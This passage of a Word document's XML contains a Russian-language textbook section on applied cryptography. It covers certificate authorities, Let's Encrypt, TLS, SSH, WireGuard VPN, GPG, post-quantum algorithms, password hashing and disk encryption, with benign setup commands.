        <w:t>Атака</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Если хакер скомпрометирует CA, он может выпустить поддельный сертификат для `google.com` и перехватывать трафик. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный случай</w:t>
      </w:r>
      <w:r>
        <w:t>: 2011 год — компания DigiNotar (нидерландский CA) была взломана, выпустили поддельные сертификаты для `google.com`. Браузеры удалили DigiNotar из списков доверенных CA, компания обанкротилась.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Let's Encrypt — бесплатные сертификаты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Год</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 2016  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Автоматизированная выдача сертификатов (через ACME протокол)  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Срок действия</w:t>
      </w:r>
      <w:r>
        <w:t>: 90 дней (автоматическое продление)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как получить</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Установка certbot (клиент Let's Encrypt)</w:t>
        <w:br/>
        <w:t>sudo apt install certbot</w:t>
        <w:br/>
        <w:br/>
        <w:t># Получение сертификата для домена</w:t>
        <w:br/>
        <w:t>sudo certbot certonly --standalone -d example.com</w:t>
        <w:br/>
        <w:br/>
        <w:t># Сертификат сохранён в /etc/letsencrypt/live/example.com/</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результат</w:t>
      </w:r>
      <w:r>
        <w:t>: Теперь 80% сайтов используют HTTPS (в 2015 году было ~40%).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.2.7. Протоколы безопасности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>TLS/SSL (Transport Layer Security)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это</w:t>
      </w:r>
      <w:r>
        <w:t>: Протокол для защиты данных в интернете (HTTPS, SMTPS, IMAPS).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>История</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1995 — SSL 2.0 (Netscape, много дыр)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1996 — SSL 3.0 (лучше, но уязвим к POODLE атаке)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1999 — TLS 1.0 (переименовали SSL, исправили баги)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2008 — TLS 1.2 (добавили GCM, SHA-256)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2018 — TLS 1.3 (быстрее, безопаснее, убрали устаревшие алгоритмы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает TLS handshake (TLS 1.3)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**ClientHello**: Клиент отправляет список поддерживаемых алгоритмов (AES-GCM, ChaCha20-Poly1305, TLS_AES_256_GCM_SHA384)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**ServerHello**: Сервер выбирает алгоритм, отправляет сертификат</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Key Exchange**: Клиент и сервер генерируют общий секретный ключ (ECDHE)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Finished**: Переключаются на шифрованное соединение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Скорость</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: TLS 1.3 — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1 RTT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (round-trip time), TLS 1.2 — 2 RTT (быстрее на ~200ms для удалённых серверов).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>SSH (Secure Shell)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это</w:t>
      </w:r>
      <w:r>
        <w:t>: Протокол для удалённого управления серверами (заменил Telnet, который передавал пароли в открытом виде — лол).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Клиент** подключается к серверу (`ssh user@example.com`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сервер** отправляет свой публичный ключ (хранится в `~/.ssh/known_hosts`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Аутентификация**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пароль (плохо, легко перехватить keylogger'ом)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Публичный ключ (лучше): клиент отправляет свой публичный ключ, сервер проверяет</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Генерация SSH-ключа</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Генерация ключа (Ed25519, ECC)</w:t>
        <w:br/>
        <w:t>ssh-keygen -t ed25519 -C "your_email@example.com"</w:t>
        <w:br/>
        <w:br/>
        <w:t># Копирование публичного ключа на сервер</w:t>
        <w:br/>
        <w:t>ssh-copy-id user@example.com</w:t>
        <w:br/>
        <w:br/>
        <w:t># Подключение (без пароля!)</w:t>
        <w:br/>
        <w:t>ssh user@example.com</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Где используется</w:t>
      </w:r>
      <w:r>
        <w:t>: GitHub, GitLab, AWS, любые серверы Linux.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>VPN (Virtual Private Network)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это</w:t>
      </w:r>
      <w:r>
        <w:t>: Туннель, который шифрует весь трафик между твоим компьютером и VPN-сервером.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обход блокировок** (YouTube, Twitter в России, Netflix в других странах)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Защита в общественных Wi-Fi** (чтобы сосед в кафе не перехватил твои пароли)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Корпоративные сети** (доступ к внутренним ресурсам компании из дома)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Протоколы VPN</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**OpenVPN** (старый, надёжный, медленный)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**WireGuard** (новый, быстрый, простой, **рекомендуется**)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**IPsec** (корпоративный, сложный)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**L2TP/IPsec** (устарел, медленный)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**PPTP** (устарел, **не используй**, легко взломать)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Настройка WireGuard (Ubuntu):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Установка</w:t>
        <w:br/>
        <w:t>sudo apt install wireguard</w:t>
        <w:br/>
        <w:br/>
        <w:t># Генерация ключей</w:t>
        <w:br/>
        <w:t>wg genkey | tee privatekey | wg pubkey &gt; publickey</w:t>
        <w:br/>
        <w:br/>
        <w:t># Конфигурация /etc/wireguard/wg0.conf</w:t>
        <w:br/>
        <w:t>[Interface]</w:t>
        <w:br/>
        <w:t>PrivateKey = &lt;твой приватный ключ&gt;</w:t>
        <w:br/>
        <w:t>Address = 10.0.0.2/24</w:t>
        <w:br/>
        <w:br/>
        <w:t>[Peer]</w:t>
        <w:br/>
        <w:t>PublicKey = &lt;публичный ключ сервера&gt;</w:t>
        <w:br/>
        <w:t>Endpoint = vpn.example.com:51820</w:t>
        <w:br/>
        <w:t>AllowedIPs = 0.0.0.0/0  # весь трафик через VPN</w:t>
        <w:br/>
        <w:br/>
        <w:t># Запуск</w:t>
        <w:br/>
        <w:t>sudo wg-quick up wg0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Скорость</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: WireGuard — до </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1 Gbps</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (на современном железе), OpenVPN — ~100-200 Mbps.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>PGP/GPG (Pretty Good Privacy / GNU Privacy Guard)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что это</w:t>
      </w:r>
      <w:r>
        <w:t>: Шифрование и подписание email'ов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Генерируешь пару ключей** (публичный + приватный)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Публичный ключ** выкладываешь на keyserver (keys.openpgp.org)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифрование**: Отправитель берёт твой публичный ключ, шифрует письмо, отправляет</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Расшифрование**: Ты расшифровываешь своим приватным ключом</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Генерация ключа</w:t>
        <w:br/>
        <w:t>gpg --full-generate-key</w:t>
        <w:br/>
        <w:br/>
        <w:t># Экспорт публичного ключа</w:t>
        <w:br/>
        <w:t>gpg --export --armor your_email@example.com &gt; public_key.asc</w:t>
        <w:br/>
        <w:br/>
        <w:t># Шифрование файла</w:t>
        <w:br/>
        <w:t>gpg --encrypt --recipient your_email@example.com secret.txt</w:t>
        <w:br/>
        <w:br/>
        <w:t># Расшифрование</w:t>
        <w:br/>
        <w:t>gpg --decrypt secret.txt.gpg &gt; secret.txt</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Почти никто не использует PGP (сложно, неудобно). </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Альтернатива</w:t>
      </w:r>
      <w:r>
        <w:t>: Signal, Telegram (E2E шифрование из коробки).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.2.8. Квантовая криптография: конец игры?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Квантовые компьютеры (когда их построят) смогут взломать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>RSA и ECC</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> за минуты с помощью </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>алгоритма Шора</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (факторизация больших чисел).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда это произойдёт?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оптимисты (Google, IBM): 2030-2040 годы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пессимисты: 2050+ (или никогда, слишком сложно)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Post-Quantum Cryptography (PQC)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>NIST в 2022 году выбрал алгоритмы, которые выдержат атаки квантовых компьютеров:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CRYSTALS-Kyber** (шифрование) — основан на lattice-криптографии</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CRYSTALS-Dilithium** (цифровые подписи)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SPHINCS+** (подписи, резервный вариант)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда внедрят?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TLS 1.4 / TLS 1.3.1 (примерно 2025-2027 годы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Google Chrome уже тестирует (2024 год)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Квантовое распределение ключей (QKD)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Использует квантовые эффекты (например, запутанность фотонов) для обмена ключами. Если кто-то подслушивает — это детектируется.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Работает только на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>короткие расстояния</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (~100 км через оптоволокно). Нужны квантовые повторители (пока не существуют в промышленном масштабе).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t>: Пока не паримся, но уже готовим замену RSA/ECC.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.2.9. Практические примеры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Как работает вход на сайт (HTTPS + хэширование паролей)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сценарий</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты заходишь на `https://example.com` и вводишь логин/пароль.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шаги</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**TLS handshake**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Браузер и сервер договариваются об алгоритме (AES-256-GCM + ECDHE)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Генерируют общий секретный ключ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Устанавливают зашифрованное соединение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Отправка пароля**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Браузер отправляет `{username: "alice", password: "super_secret"}` **по HTTPS** (зашифровано)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Хранение пароля на сервере**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сервер **НЕ хранит пароль** в открытом виде</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вычисляет `hash = bcrypt(password, salt)` и сохраняет в базу данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Проверка пароля**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При следующем входе: сервер берёт введённый пароль, вычисляет bcrypt, сравнивает с хэшем в базе</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если совпадает → вход успешен</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Безопасность</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ HTTPS защищает пароль от перехвата (Man-in-the-Middle атака)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>✅ bcrypt защищает от утечки базы данных (хакер получит хэши, но не пароли)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Шифрование диска (BitLocker, FileVault, LUKS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сценарий</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты потерял ноутбук. Как защитить данные?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>: Полное шифрование диска (Full Disk Encryption, FDE).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**При установке ОС**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Генерируется **мастер-ключ** (256-битный AES ключ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Мастер-ключ шифруется паролем пользователя (PBKDF2 или Argon2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Зашифрованный мастер-ключ сохраняется на диск</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**При загрузке**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вводишь пароль</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Расшифровывается мастер-ключ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Все данные на диске расшифровываются "на лету" (прозрачно для пользователя)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Если ноутбук украли**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Без пароля — мастер-ключ не расшифровать</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Без мастер-ключа — диск невозможно прочитать (даже вытащив жёсткий диск)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Производительность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Современные процессоры (AES-NI) шифруют/расшифровывают </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5-10 GB/s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> → нет заметной потери скорости.</w:t>
